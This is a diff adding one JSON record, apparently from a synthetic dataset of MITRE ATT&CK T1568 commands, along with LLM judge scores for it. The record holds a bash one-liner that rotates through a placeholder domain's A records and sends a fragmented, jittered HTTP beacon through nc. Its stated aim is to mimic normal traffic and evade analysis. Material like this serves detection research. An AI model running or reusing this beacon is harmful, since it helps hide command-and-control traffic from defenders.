@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"host=update-assets.example.com; ips=$(dig +short \\\"$host\\\" A); ua=\\\"Mozilla/5.0 (X11; Ubuntu) AppleWebKit/537.36\\\"; req=$(printf 'GET /analytics.js HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nAccept: */*\\r\\nConnection: close\\r\\n\\r\\n' \\\"$host\\\" \\\"$ua\\\"); for ip in $(printf '%s\\n' \\\"$ips\\\" | shuf); do printf '%s' \\\"$req\\\" | fold -w 20 | while read -r chunk; do printf '%s' \\\"$chunk\\\"; sleep 0.$((RANDOM%5+1)); done | nc -w 5 \\\"$ip\\\" 80 && break; sleep $((RANDOM%3+1)); done\"",
+  "explanation": "Implements fast flux by shuffling through multiple A records for a domain, fragmenting the HTTP request and adding timing jitter to evade traffic analysis while mimicking a request for analytics.js.",
+  "rationale_steps": [
+    "Query multiple A records to leverage fast-flux style dynamic resolution.",
+    "Randomize IP selection at runtime for resiliency.",
+    "Mimic normal HTTP traffic (analytics.js) with realistic headers.",
+    "Fragment the request and add delays to complicate analysis."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-1d90a008",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting, proper separators, valid options, and correctly nested pipelines/loops make it well-formed and runnable.",
+        "semantic_score": 4,
+        "semantic_justification": "It dynamically resolves and rotates A-record endpoints and adds jittered fragmentation consistent with T1568 behaviors, but the fold|read pipeline removes LF from CRLF (malforming the HTTP request) and the ‘fast-flux’ aspect is only emulated client-side.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:11:32.073318Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with balanced quotes and valid constructs, though the nested command substitution and pipe-within-while-loop inside a for loop creates complex quoting that may behave unexpectedly in some bash versions, and the fold/read chunking approach has edge cases with printf output.",
+        "semantic_score": 4,
+        "semantic_justification": "The command credibly implements fast-flux C2 behavior by resolving multiple A records via dig, shuffling them with shuf to rotate endpoints, fragmenting HTTP requests with timing jitter via fold/sleep to evade traffic analysis, and using a browser-like User-Agent to blend in, though the chunked request fragmentation via fold may corrupt HTTP framing and the 'fast flux' claim is partially accurate since it relies on multiple A records rather than true rapid DNS TTL rotation.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-19T00:17:36.726078Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct shell syntax, balanced escaped quotes for the bash -c wrapper, and valid logic for loops and pipes.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively simulates the client-side behavior of fast-flux (a subset of T1568) by resolving multiple A records and shuffling them, while also implementing traffic fragmentation and jitter to mimic evasive command-and-control communication.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:17:41.343165Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
